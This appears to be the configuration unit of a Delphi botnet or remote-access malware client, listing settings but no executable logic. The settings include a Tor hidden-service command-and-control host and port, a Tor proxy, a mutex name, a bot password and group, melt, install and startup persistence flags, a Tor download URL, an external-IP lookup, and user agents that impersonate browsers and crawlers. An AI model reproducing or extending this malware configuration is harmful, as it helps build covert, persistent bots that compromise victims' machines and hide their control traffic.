unit UConfig;

interface

var
Av:string;
Fw:string;
OsBytes:string;
IP:string;

Const
RHost :String = '00000000000000.onion';
RPort :integer = 1515;
RPHost:string = 'Localhost';
RPPort:Integer = 9050;
BotVersion : string = '0.1A';
_strStartupK_ :string = 'StartUpKey';
_strMutexNam_ :string = 'Hydraside1234';
_TorName_     :string = 'Tor.exe';
_strFilename_ :string = 'Server.exe';
_TorUrlDownload_ :string = 'www.example.com/tor.exe';
_boolMelt_    :boolean = false;
_boolInstall_ :boolean = false;
_boolStartup_ :boolean = false;
_iConneTimer_:Integer = 1;
/////
BotPassword:String = '1234abcd';
GroupStr: String = 'Alphi Test';
Version:String = '0.1A';
_Get_external_ip_:string ='http://en.softmaker.kz/get_an_external_ip_address.php';

UserAgents: array[0..26] of string =
  ('Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0)',
    'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1)',
    'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2)',
    'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0)',
    'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1)',
    'Opera/7.51 (Windows NT 5.0; U) [en]',
    'Opera/7.51 (Windows NT 5.1; U) [en]',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0',
    'Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/12.0.742.53 Safari/534.36 QQBrowser/6.3.8908.201',
    'Opera/7.51 (Windows NT 5.2; U) [en]', 'Opera/7.51 (Windows NT 6.0; U) [en]', 'Opera/7.51 (Windows NT 6.1; U) [en]',
    'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; ru) Opera 10.10', 'Opera/9.80 (X11; Linux x86_64; U; ru) Presto/2.2.15 Version/10.10',
    'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.0.4) Gecko/2008111611 Gentoo Iceweasel/3.0.4',
    'Mozilla/1.1 (compatible; MSPIE 2.0; Windows CE)', 'Mozilla/1.10 [en] (Compatible; RISC OS 3.70; Oregano 1.10)',
    'Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)', 'Googlebot', 'MSNBot', 'Yandex', 'StackRambler',
    'Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2');

implementation

end.
